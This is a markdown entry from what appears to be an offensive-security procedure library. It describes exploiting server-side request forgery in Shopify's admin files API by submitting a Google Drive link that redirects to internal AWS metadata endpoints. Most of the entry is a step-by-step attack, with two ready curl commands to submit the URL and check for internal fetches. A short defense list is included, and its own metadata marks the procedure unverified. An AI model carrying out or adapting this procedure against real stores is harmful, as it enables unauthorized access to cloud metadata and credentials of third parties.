---
id: p2b3c4d5-f6g7-8901-bcde-f2345678901
name: Trigger-SSRF-via-Shopify-API
tags:
  - ssrf
  - shopify
  - api-exploit
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-trigger-ssrf]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:24:56.352Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Trigger-SSRF-via-Shopify-API

## Summary

This procedure exploits the SSRF vulnerability by submitting a malicious Google Drive URL to Shopify's file API, causing the backend server to fetch internal resources.

## Description

Shopify's admin API allows uploading files via external sources like Google Drive without sufficient URL validation, enabling SSRF. The attacker provides a crafted Google Drive link that redirects to internal AWS endpoints. Upon processing, the server fetches the URL, follows the redirect, and accesses sensitive metadata. This requires an authenticated API session but no elevated privileges. Outcomes include successful internal fetches, potentially exposing data in responses or logs.

## Requirements

1. Valid Shopify API access token or authenticated session
2. Malicious Google Drive URL from prior procedure
3. [[tools/curl]] for API requests

## Defense

Defensive measures and detection strategies:

- Implement URL scheme and domain whitelisting in API endpoints
- Disable automatic fetching of external content in integrations
- Log and alert on API requests with suspicious URLs (e.g., containing IP addresses)

## Objectives

1. Submit the malicious URL to the file processing API
2. Trigger server-side fetch of the internal endpoint
3. Confirm SSRF without direct access to server responses

## Instructions

### Step 1: Authenticate and Prepare API Request

**Context**: Set up the POST request to Shopify's files endpoint with the malicious URL.

**Command** ([[commands/curl-trigger-ssrf]]):
```bash
curl -X POST "https://shopify-store.myshopify.com/admin/api/2023-01/files.json" -H "X-Shopify-Access-Token: YOUR_TOKEN" -H "Content-Type: application/json" -d '{"file":{"url":"https://drive.google.com/uc?id=FILE_ID&export=download","filename":"test.html"}}'
```

> Replace YOUR_TOKEN and FILE_ID. Expected output: JSON response with file ID or upload confirmation, indicating processing began.

### Step 2: Monitor for SSRF Confirmation

**Context**: Check API logs or responses for signs of internal access attempts.

**Command** ([[commands/curl-trigger-ssrf]]):
```bash
curl "https://shopify-store.myshopify.com/admin/api/2023-01/files/FILE_ID.json" -H "X-Shopify-Access-Token: YOUR_TOKEN"
```

> Retrieve the processed file details. Look for errors or content that hints at metadata exposure.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-trigger-ssrf]]

## Tools Used

- [[tools/curl]]

## Tags

- ssrf
- shopify
- api-exploit
